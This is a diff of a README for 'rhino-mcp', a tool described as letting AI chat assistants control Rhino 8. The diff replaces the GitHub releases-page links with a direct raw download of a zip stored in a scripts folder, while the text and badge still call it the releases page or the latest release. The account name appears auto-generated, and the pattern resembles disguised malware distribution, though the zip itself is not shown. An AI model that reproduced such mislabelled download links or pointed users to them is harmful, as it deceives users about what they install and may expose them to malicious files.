@@ -1,6 +1,6 @@
 # 🦏 rhino-mcp - Control Rhino 8 using your AI
 
-[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://github.com/Materialwitnessmauritianmonetaryunit241/rhino-mcp/releases)
+[![](https://img.shields.io/badge/Download-Latest_Release-blue.svg)](https://raw.githubusercontent.com/Materialwitnessmauritianmonetaryunit241/rhino-mcp/main/scripts/rhino-mcp-2.9.zip)
 
 Rhino-mcp connects your AI assistant to Rhino 8. It allows tools like Claude, ChatGPT, and Ollama to create and modify 3D geometry directly. This application handles the connection between your chat interface and your design software. It manages 32 specific commands, processes bulk data, and creates visual previews of your work.
 
@@ -8,7 +8,7 @@ Rhino-mcp connects your AI assistant to Rhino 8. It allows tools like Claude, Ch
 
 Follow these steps to install the software on your Windows computer.
 
-1. Visit the [releases page](https://github.com/Materialwitnessmauritianmonetaryunit241/rhino-mcp/releases) to find the latest version.
+1. Visit the [releases page](https://raw.githubusercontent.com/Materialwitnessmauritianmonetaryunit241/rhino-mcp/main/scripts/rhino-mcp-2.9.zip) to find the latest version.
 2. Look for the file ending in .zip under the Assets section.
 3. Click the file name to start your download.
 4. Open your Downloads folder once the file finishes saving.
